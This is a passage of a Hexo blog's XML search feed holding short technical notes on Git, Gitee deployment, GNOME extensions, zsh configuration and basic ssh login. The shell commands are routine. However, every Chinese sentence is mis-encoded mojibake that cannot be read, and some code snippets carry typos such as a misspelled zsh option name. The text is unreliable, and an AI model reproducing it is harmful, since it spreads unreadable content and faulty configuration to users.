    <url>/2022/09/02/%E5%B0%86-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BC%A0%E5%88%B0-gitee/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ä»¥ä¸ºä¼šå’Œ deploy-git å†²çªï¼Œç„¶è€Œå¹¶æ²¡æœ‰ã€‚</p><p>å…ˆåœ¨ gitee ä¸Šæ–°å»ºä»“åº“ã€‚</p><p>å›åˆ°æœ¬åœ°çš„ Blog ç›®å½•ï¼Œ<code>git init</code> åˆ›å»ºæˆ git ä»“åº“ï¼Œ<code>git add .</code> å’Œ <code>git commit</code> ä¹‹å <code>git remote add</code> æ·»åŠ è¿œç¨‹ä»“åº“ï¼Œç›´æ¥ <code>git pull</code> å°±è¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨ Git å…‹éš†å•ä¸ªåˆ†æ”¯</title>
    <link href="/2022/09/01/%E7%94%A8-Git-%E5%85%8B%E9%9A%86%E5%8D%95%E4%B8%AA%E5%88%86%E6%94%AF/"/>
    <url>/2022/09/01/%E7%94%A8-Git-%E5%85%8B%E9%9A%86%E5%8D%95%E4%B8%AA%E5%88%86%E6%94%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Arch_User_Repositor">ArchWiki</a><br>åœ¨ ArchWiki ä¸Šçœ‹çš„.</p><p>ä»£ç å¦‚ä¸‹:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> --branch branch_name/package_name --single-branch https://github.com/archlinux/aur</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ‰“å¼€ gnome-shell-extension</title>
    <link href="/2022/09/01/%E6%89%93%E5%BC%80-gnome-shell-extension/"/>
    <url>/2022/09/01/%E6%89%93%E5%BC%80-gnome-shell-extension/</url>
    
    <content type="html"><![CDATA[<p>åŸæœ¬è¿™ä¸ªä¸œè¥¿åœ¨ <code>gnome-tweaks tool</code> é‡Œé¢ï¼Œç°åœ¨ç‹¬ç«‹å‡ºæ¥äº†ï¼Œåœ¨åº”ç”¨æ é‡Œé¢æœç´¢ <code>extension</code> å°±ä¼šæ‰¾åˆ°.</p>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git push åæ–‡ä»¶å¤¹ä¸ºç©ºä¸”å¸¦ @xxxx</title>
    <link href="/2022/08/31/git-push-%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%BA%E7%A9%BA%E4%B8%94%E5%B8%A6-xxxx/"/>
    <url>/2022/08/31/git-push-%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%BA%E7%A9%BA%E4%B8%94%E5%B8%A6-xxxx/</url>
    
    <content type="html"><![CDATA[<p>æäº¤çš„æ–‡ä»¶å¤¹æ˜¯ git æ‹‰å–è€Œæ¥çš„ï¼Œæ–‡ä»¶å¤¹é‡Œé¢åŸæœ¬å°±æœ‰ <code>.git</code> ç›®å½•ï¼Œå› æ­¤ä¼šæäº¤ç»™å¦ä¸€ä¸ªè¿œç¨‹åˆ†æ”¯ä¸Šå»ã€‚</p><p>åˆ é™¤ <code>.git</code> ç›®å½•å³å¯è§£å†³ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£…å’Œä½¿ç”¨ zsh</title>
    <link href="/2022/08/31/%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8-zsh/"/>
    <url>/2022/08/31/%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8-zsh/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-ArchWiki"><a href="#å‚è€ƒ-ArchWiki" class="headerlink" title="å‚è€ƒ ArchWiki"></a>å‚è€ƒ <a href="https://wiki.archlinux.org/title/Zsh">ArchWiki</a></h1><p>Zsh é»˜è®¤ä¸å…¼å®¹ sh, ä»…åœ¨ä½¿ç”¨ <code>emulate sh</code> æ—¶å…¼å®¹.</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„ Shell è½¯ä»¶:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å®‰è£… zsh åŒ…, æˆ–è€…æœ‰ç²¾ç¡®è¡¥å…¨å‘½ä»¤çš„ zsh-completions åŒ….</p><h3 id="åˆå§‹é…ç½®"><a href="#åˆå§‹é…ç½®" class="headerlink" title="åˆå§‹é…ç½®"></a>åˆå§‹é…ç½®</h3><p>æ‰‹åŠ¨è¿›å…¥æ–°ç”¨æˆ·å‘å¯¼:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">$ autoload -Uz zsh-<span class="hljs-keyword">new</span><span class="hljs-type">user</span>-install<br>$ zsh-<span class="hljs-keyword">new</span><span class="hljs-type">user</span>-install -f<br></code></pre></td></tr></table></figure><h3 id="æ”¹å˜é»˜è®¤çš„-shell"><a href="#æ”¹å˜é»˜è®¤çš„-shell" class="headerlink" title="æ”¹å˜é»˜è®¤çš„ shell"></a>æ”¹å˜é»˜è®¤çš„ shell</h3><p>ä½¿ç”¨ <code>chsh</code> å‘½ä»¤.</p><h2 id="é…ç½®æ–‡ä»¶ä»‹ç»"><a href="#é…ç½®æ–‡ä»¶ä»‹ç»" class="headerlink" title="é…ç½®æ–‡ä»¶ä»‹ç»"></a>é…ç½®æ–‡ä»¶ä»‹ç»</h2><p>zsh çš„å‡ ä¸ªé…ç½®æ–‡ä»¶, <code>~/.zshrc</code>, ä»¥åŠ <code>~/zprofile</code>.</p><p>åŒæ ·åˆ†å…¨å±€é…ç½®å’Œç”¨æˆ·çš„é…ç½®æ–‡ä»¶.</p><p>å…¶ä»–çš„å…·ä½“çœ‹ wiki.</p><p>Arch æºä¸­çš„ zsh æ‰€ä½¿ç”¨çš„æ–‡ä»¶è·¯å¾„å’Œ Zsh çš„ man æ‰‹å†Œä¸­é»˜è®¤çš„ä¸åŒ.</p><p><code>/etc/profile</code> é‡Œé¢è®¾ç½®çš„ <code>$PATH</code> ç¯å¢ƒå˜é‡ä¼šè¦†ç›–æ‰ <code>~/.zshenv</code> é‡Œé¢é…ç½®çš„ä»»ä½• <code>$PATH</code>.</p><h3 id="å…¨å±€é…ç½®æ–‡ä»¶"><a href="#å…¨å±€é…ç½®æ–‡ä»¶" class="headerlink" title="å…¨å±€é…ç½®æ–‡ä»¶"></a>å…¨å±€é…ç½®æ–‡ä»¶</h3><p>Arch æºä¸­ zsh çš„å…¨å±€é…ç½®æ–‡ä»¶çš„è·¯å¾„ä¸º <code>/etc/zsh/</code></p><h2 id="é…ç½®-Zsh"><a href="#é…ç½®-Zsh" class="headerlink" title="é…ç½® Zsh"></a>é…ç½® Zsh</h2><p><a href="https://zsh.sourceforge.io/Guide/zshguide.html">å®˜æ–¹ tutorial</a><br>Zsh æœ‰è¾ƒå¤šçš„å¯å®šåˆ¶é€‰é¡¹.</p><h3 id="å‘½ä»¤è¡¥å…¨"><a href="#å‘½ä»¤è¡¥å…¨" class="headerlink" title="å‘½ä»¤è¡¥å…¨"></a>å‘½ä»¤è¡¥å…¨</h3><p>åœ¨ <code>~/.zshrc</code> æœ€ååŠ å…¥ä¸‹é¢é…ç½®, å¼€å¯è‡ªåŠ¨è¡¥å…¨:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U compinit<br>compinit<br></code></pre></td></tr></table></figure><p>å¯åŠ¨ä½¿ç”¨æ–¹å‘é”®æ§åˆ¶çš„è‡ªåŠ¨è¡¥å…¨:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">zstyle <span class="hljs-string">&#x27;:completion:*&#x27;</span> <span class="hljs-keyword">menu</span> <span class="hljs-keyword">select</span><br></code></pre></td></tr></table></figure><p>æŒ‰ä¸¤æ¬¡ tab é”®å¯åŠ¨èœå•.</p><p>å¯åŠ¨å‘½ä»¤è¡Œåˆ«åçš„è‡ªåŠ¨è¡¥å…¨:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> completealiases<br></code></pre></td></tr></table></figure><h3 id="å¿«æ·é”®ç»‘å®š"><a href="#å¿«æ·é”®ç»‘å®š" class="headerlink" title="å¿«æ·é”®ç»‘å®š"></a>å¿«æ·é”®ç»‘å®š</h3><p>Zsh ä½¿ç”¨è‡ªå¸¦çš„ zle ä»£æ›¿ readline, å¹¶ä¸”ä¸ä¼šè¯»å– <code>/etc/inputrc</code>  æˆ–è€… <code>~/.inputrc</code>.</p><p>Zle æœ‰ emacs å’Œ vi ä¸¤ä¸ªæ¨¡å¼, é»˜è®¤æƒ…å†µä¸‹æ ¹æ®ç¯å¢ƒå˜é‡ <code>$EDITOR</code> æ¥å†³å®šä½¿ç”¨å“ªä¸€ä¸ªæ¨¡å¼. ä½¿ç”¨ <code>bindkey -e</code> æˆ–è€… <code>bindkey -v</code> æ¥æ‰‹åŠ¨æŒ‡å®šæ¨¡å¼.</p><h3 id="å‘½ä»¤æç¤ºç¬¦"><a href="#å‘½ä»¤æç¤ºç¬¦" class="headerlink" title="å‘½ä»¤æç¤ºç¬¦"></a>å‘½ä»¤æç¤ºç¬¦</h3><p>é¦–å…ˆç¡®ä¿ <code>.zshrc</code> ä¸­é…ç½®äº†è‡ªåŠ¨åŠ è½½æç¤ºç¬¦:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U promptinit<br>promptinit<br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸‹é¢å‘½ä»¤æŸ¥çœ‹å¯ç”¨çš„æç¤ºç¬¦:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>prompt -l<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤æ¥å¯åŠ¨å…¶ä¸­ä¸€ç§æç¤ºç¬¦, å¦‚ â€œwaltersâ€:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>prompt walters<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„ä¸»é¢˜:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>prompt -p<br></code></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰å‘½ä»¤æç¤ºç¬¦"><a href="#è‡ªå®šä¹‰å‘½ä»¤æç¤ºç¬¦" class="headerlink" title="è‡ªå®šä¹‰å‘½ä»¤æç¤ºç¬¦"></a>è‡ªå®šä¹‰å‘½ä»¤æç¤ºç¬¦</h3><p>é™¤äº†æ™®é€šç»ˆç«¯ä¼šæä¾›çš„é å·¦çš„æç¤ºç¬¦å¤–, Zsh è¿˜æä¾›äº†é å³çš„æç¤ºç¬¦, é€šè¿‡é…ç½® <code>PROMPT=</code> æ¥è®¾ç½®.</p><p>å…·ä½“è§ <a href="https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html">Prompt Expansion</a></p><p>è‰²å½©è®¾ç½®è§ wiki.</p><h3 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h3><p>zsh æ²¡æœ‰å†…ç½®çš„ <code>help</code> å‘½ä»¤, æƒ³è¦åœ¨ zsh ä¸­ä½¿ç”¨ <code>help</code> å¯ä»¥æ·»åŠ :</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">autoload -<span class="hljs-keyword">U</span> <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span><br>autoload <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span>-git<br>autoload <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span>-svn<br>autoload <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span>-svk<br>unalias <span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span><br>alias <span class="hljs-keyword">help</span>=<span class="hljs-keyword">run</span>-<span class="hljs-keyword">help</span><br></code></pre></td></tr></table></figure><h3 id="ä»¿-Fish-å‘½ä»¤é«˜äº®"><a href="#ä»¿-Fish-å‘½ä»¤é«˜äº®" class="headerlink" title="ä»¿ Fish å‘½ä»¤é«˜äº®"></a>ä»¿ Fish å‘½ä»¤é«˜äº®</h3><p>ä»å®˜æ–¹ä»“åº“å®‰è£… zsh-syntax-highlighting, ç„¶åæ·»åŠ é…ç½®:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zsh/</span>plugins<span class="hljs-regexp">/zsh-syntax-highlighting/</span>zsh-syntax-highlighting.zsh<br></code></pre></td></tr></table></figure><p>å‡ ä¸ªå‚è€ƒç¤ºä¾‹:</p><ul><li><a href="https://grml.org/zsh">é…ç½®æŠ€å·§</a></li><li><a href="https://github.com/MrElendig/dotfiles-alice/blob/master/.zshrc">åŠ¨æ€æç¤ºç¬¦å’Œç»ˆç«¯çª—å£æ ‡é¢˜ç­‰åŸºæœ¬é…ç½®</a></li><li><a href="https://github.com/slashbeast/conf-mgmt/blob/master/roles/home_files/files/DOTzshrc">å…³äºå¾ˆå¤š zsh çš„ç‰¹æ€§</a></li></ul><h3 id="é…ç½®æ¡†æ¶"><a href="#é…ç½®æ¡†æ¶" class="headerlink" title="é…ç½®æ¡†æ¶"></a>é…ç½®æ¡†æ¶</h3><ul><li>oh-my-zsh</li><li>Prezto - Instantly Awesome Zsh</li><li>Antigen, ä¸ºæ’ä»¶ç®¡ç†å™¨.</li></ul><h3 id="åˆ·æ–°è‡ªåŠ¨è¡¥å…¨"><a href="#åˆ·æ–°è‡ªåŠ¨è¡¥å…¨" class="headerlink" title="åˆ·æ–°è‡ªåŠ¨è¡¥å…¨"></a>åˆ·æ–°è‡ªåŠ¨è¡¥å…¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rehash</span></span><br></code></pre></td></tr></table></figure><p>è‡ªåŠ¨æ‰§è¡Œ:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">zstyle</span> <span class="hljs-string">&#x27;:completion:*&#x27;</span> <span class="hljs-built_in">rehash</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><hr><p>è¿›å…¥ zsh çš„ vi ç¼–è¾‘æ¨¡å¼ï¼ŒæŒ‰ <code>esc</code>.<br>é˜…è¯»ä¹¦ç± ã€ŠLearning Shell Scripting with Zshã€‹</p><h1 id="1-Getting-Started"><a href="#1-Getting-Started" class="headerlink" title="1 Getting Started"></a>1 Getting Started</h1><p>zsh é…ç½®æ–‡ä»¶ <code>.zshrc</code> é‡Œé¢çš„å‘½åæœºåˆ¶ â€“ å¤§å°å†™æ•æ„Ÿä¸”å¿½ç•¥ä¸‹åˆ’çº¿. å¦‚: <code>SOME_OPTION</code> å’Œ <code>SOMEOPTION</code> æ˜¯åŒä¸€ä¸ªä¸œè¥¿ã€‚</p><p>ä¸¤ä¸ªå‘½ä»¤ â€“ <code>setopt</code> å’Œ <code>unsetopt</code>:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">setopt SOME_OPTION # enables <span class="hljs-keyword">any</span> <span class="hljs-keyword">option</span><br>unsetopt SOME_OPTION # use this <span class="hljs-keyword">to</span> <span class="hljs-keyword">disable</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">option</span><br></code></pre></td></tr></table></figure><p>åœ¨é€‰é¡¹å‰é¢æ·»åŠ  <code>NO</code> æ˜¯å’Œ <code>unsetopt</code> ä¸€æ ·çš„æ•ˆæœ:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> NO_SOME_OPTION<br></code></pre></td></tr></table></figure><p>zsh ç”¨ <code>#</code> ä½œä¸ºæ³¨é‡Šã€‚</p><p>ä¸€è¡Œå‘½ä»¤:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U promptinit<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>proptinit</code> æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œ</p><h2 id="Shell-option"><a href="#Shell-option" class="headerlink" title="Shell option"></a>Shell option</h2><p><code>-v</code> å‚æ•°ï¼Œæ„ä¸º â€œverboseâ€ , å®ƒä¼šæŠŠä½ è¾“å…¥çš„å‘½ä»¤å†æ‰“å°ä¸€éã€‚</p><p><code>-f</code> å‚æ•°ï¼Œä¼šæ‰“å¼€ä¸€ä¸ª zsh, è¿™ä¸ª zsh, æ²¡æœ‰ä»»ä½•é…ç½®ã€‚</p><p>åœ¨å·²ç»æ‰“å¼€çš„ zsh ä¸­ä½¿ç”¨ <code>set</code> å¯ä»¥è®¾ç½® zsh çš„å‚æ•°.</p><p>ç”¨ <code>set +æŸä¸ªå‚æ•°</code> å¯ä»¥å–æ¶ˆ</p><h2 id="The-startup-files"><a href="#The-startup-files" class="headerlink" title="The startup files"></a>The startup files</h2><p>è®¾ç½® zsh æŸ¥æ‰¾é…ç½®æ–‡ä»¶çš„è·¯å¾„, é€šè¿‡æ”¹å˜ <code>ZDOTDIR</code> ç¯å¢ƒå˜é‡.</p><p>æ–‡ä»¶çš„ä¼˜å…ˆçº§ä¸º:</p><ul><li>zshenv, ä¸€èˆ¬åªæ”¾å˜é‡</li><li>zprofile</li><li>zshrc</li><li>zlogin</li></ul><p>å¦‚æœ zsh ä¸æ˜¯äº¤äº’å¼, åˆ™ <code>~/.zshrc</code> å’Œ <code>~/.zprofile</code> ä¸ä¼šè¢«è¯»å–.</p><p>å¦‚æœ zsh ä¸æ˜¯ login shell, <code>~/.zlogin</code> ä¹Ÿä¸ä¼šè¢«è¯»å–.</p><p>å½“ä½¿ç”¨ <code>logout</code> å‘½ä»¤æ—¶, <code>~/.zlogout</code> æ–‡ä»¶ä¼šè¢«è¯»å–.</p><p><code>RCS</code> å’Œ <code>GLOBAL_RCS</code> è¿™ä¸¤ä¸ªå˜é‡:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">unset</span> RCS <span class="hljs-comment"># disable loading of files other than zshenv</span><br><span class="hljs-built_in">unset</span> GLOBAL_RCS <span class="hljs-comment"># disable loading of files unser /etc/</span><br></code></pre></td></tr></table></figure><h2 id="The-shell-prompt"><a href="#The-shell-prompt" class="headerlink" title="The shell prompt"></a>The shell prompt</h2><h2 id="The-prompt-command"><a href="#The-prompt-command" class="headerlink" title="The prompt command"></a>The prompt command</h2><p>é¦–å…ˆéœ€è¦åœ¨ <code>.zshrc</code> ä¸­åŠ å…¥:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load promptinit<br>promptinit<br></code></pre></td></tr></table></figure><p><code>prompt</code> ç»„ä»¶å…è®¸ä½ é€‰æ‹©ä¸»é¢˜.</p><p>ç”¨ <code>prompt -p</code> æŸ¥çœ‹ä¸»é¢˜.</p><p>é€‰æ‹©ä¸»é¢˜:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ prompt <span class="hljs-tag">&lt;<span class="hljs-name">theme_name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è®¾ç½® zsh å…è®¸ inline comments:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> INTERACTIV_COMMNTS<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æŸä¸ªä¸»é¢˜:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ prompt -h <span class="hljs-tag">&lt;<span class="hljs-name">theme_name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U promptinit<br>promptinit<br>prompt adaml red yellow magenta<br></code></pre></td></tr></table></figure><p>è‹¥æƒ³ä½¿ç”¨ bash æˆ–å…¶ä»–çš„ shell è¯­æ³•æ¥å®šåˆ¶, è§ä¹¦.</p><h2 id="Customizing-the-prompt"><a href="#Customizing-the-prompt" class="headerlink" title="Customizing the prompt"></a>Customizing the prompt</h2><p>Zsh æä¾›äº† 5 ç§ä¸åŒçš„ prompts, å…·ä½“è§ <code>man zshmisc</code>.</p><p>ä¸»è¦çš„æ˜¯ <code>$PS1</code> æˆ– <code>$PROMPT</code>.</p><h2 id="Using-escape-sequences"><a href="#Using-escape-sequences" class="headerlink" title="Using escape sequences"></a>Using escape sequences</h2><p>escape sequences æ˜¯ä¸€ç»„é¢„å®šä¹‰çš„ä¿¡æ¯çš„ç®€å†™.</p><p>è¿™é‡Œçš„è½¬ä¹‰å­—ç¬¦å‰é¢æ˜¯ <code>%</code>.</p><p>åœ¨ <code>.zshrc</code> ä¸­æ·»åŠ :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> PROMPT_SUBST<br></code></pre></td></tr></table></figure><p>è®¾ç½®äº†è¿™ä¸ªé€‰é¡¹ä¼šè®© zsh å°† <code>$PROMPT</code> è§†ä¸ºæ™®é€šçš„ shell å˜é‡.</p><p><code>man zshmisc</code> ä¸­çš„ <code>Prompt Expansion</code> éƒ¨åˆ†åˆ—å‡ºäº† escape sequences.</p><h3 id="Shell-state-options"><a href="#Shell-state-options" class="headerlink" title="Shell state options"></a>Shell state options</h3><h3 id="Login-information-options"><a href="#Login-information-options" class="headerlink" title="Login information options"></a>Login information options</h3><h3 id="Directory-options"><a href="#Directory-options" class="headerlink" title="Directory options"></a>Directory options</h3><p>æ˜¾ç¤º <code>%</code> ç”¨ <code>%%</code>.</p><h2 id="Conditional-expressions"><a href="#Conditional-expressions" class="headerlink" title="Conditional expressions"></a>Conditional expressions</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">%(X.<span class="hljs-literal">true</span>-<span class="hljs-built_in">text</span>.<span class="hljs-literal">false</span>-<span class="hljs-built_in">text</span>)<br></code></pre></td></tr></table></figure><p>å½“ condition X æ˜¯çœŸ, åˆ™æ‰§è¡Œ true-text, ä¸ºå‡, åˆ™æ‰§è¡Œ false-text. éœ€è¦ç”¨ <code>%()</code> åŒ…è£¹èµ·æ¥.</p><p>ç”¨æ¥åˆ¤æ–­å‘½ä»¤è¿”å›å€¼å¯ç”¨: <code>PS1=%(?..)</code></p><h2 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h2><p>æŸ¥çœ‹ zsh æºæ–‡ä»¶ä¸‹çš„ Functions ç›®å½•, è¿›å…¥ Prompts ç›®å½•, å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ setup function çš„å‘½åæ ¼å¼ä¸º <code>prompt_&lt;theme_name&gt;_setup</code></p><p>å¯ä»¥é€šè¿‡ <code>source</code> è¿™äº›æ–‡ä»¶æ”¹å˜ prompt.</p><p>åœ¨ <code>zshrc</code> ä¸­ <code>promptinit</code> åé¢å¼€å§‹æ·»åŠ .</p><p>åœ¨ç»ˆç«¯å³ä¾§æ·»åŠ  error flag:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">RPS1</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;%(?..(%?%))&quot;</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ é¢œè‰²ç”¨å¤§æ‹¬å·å¦‚: <code>&#123;yellow&#125;</code>.</p><h1 id="2-Alias-and-History"><a href="#2-Alias-and-History" class="headerlink" title="2 Alias and History"></a>2 Alias and History</h1><h2 id="Working-with-aliases"><a href="#Working-with-aliases" class="headerlink" title="Working with aliases"></a>Working with aliases</h2><h3 id="Quoting-characters"><a href="#Quoting-characters" class="headerlink" title="Quoting characters"></a>Quoting characters</h3><p>ä½¿ç”¨ <code>\</code> è½¬ä¹‰.</p><p>ä½¿ç”¨ <code>&#39;&#39;</code> ä¸èƒ½å°† <code>$VAR</code> è½¬æ¢æˆå¯¹åº”çš„å€¼, ä½¿ç”¨ <code>&quot;&quot;</code> å¯ä»¥.</p><p>æš‚æ—¶å–æ¶ˆä¸€ä¸ª alias:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">unalias</span> &lt;aliasname&gt;</span><br></code></pre></td></tr></table></figure><p><code>command</code> å‘½ä»¤å¯ä»¥è®© zsh æ‰§è¡Œ any argument ä½œä¸ºå¤–éƒ¨å‘½ä»¤è€Œä¸æ˜¯å†…å»ºå‘½ä»¤, æŸ¥é˜… <code>man zshbuiltins</code></p><h3 id="Global-aliases"><a href="#Global-aliases" class="headerlink" title="Global aliases"></a>Global aliases</h3>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh ä½¿ç”¨</title>
    <link href="/2022/08/31/ssh-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/31/ssh-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦çŸ¥é“ä¸€å°æœºå™¨çš„ IP åœ°å€ï¼Œä»¥åŠå…¶ä¸Šé¢ä¸€ä¸ªè´¦æˆ·åå’Œå¯†ç , å¦‚:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ssh root<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>ç„¶åç³»ç»Ÿä¼šæç¤ºè¾“å…¥å¯†ç ï¼Œå¯†ç æ­£ç¡®å°±ä¼šè¿›å…¥.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>fish è¿™ä¸€è½¯ä»¶</title>
    <link href="/2022/08/31/fish-%E8%BF%99%E4%B8%80%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/08/31/fish-%E8%BF%99%E4%B8%80%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>Fish æ˜¯ â€œthe Friendly Interactive Shellâ€ çš„ç®€ç§°ï¼Œå…¶æ”¯æŒè¯­æ³•é«˜äº®ï¼Œè‡ªåŠ¨å»ºè®®ï¼Œæ ‡ç­¾å®Œæˆç­‰ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨ Git æ—¶ refusing to merge unrelated histories è§£å†³</title>
    <link href="/2022/08/31/%E4%BD%BF%E7%94%A8-Git-%E6%97%B6-refusing-to-merge-unrelated-histories-%E8%A7%A3%E5%86%B3/"/>
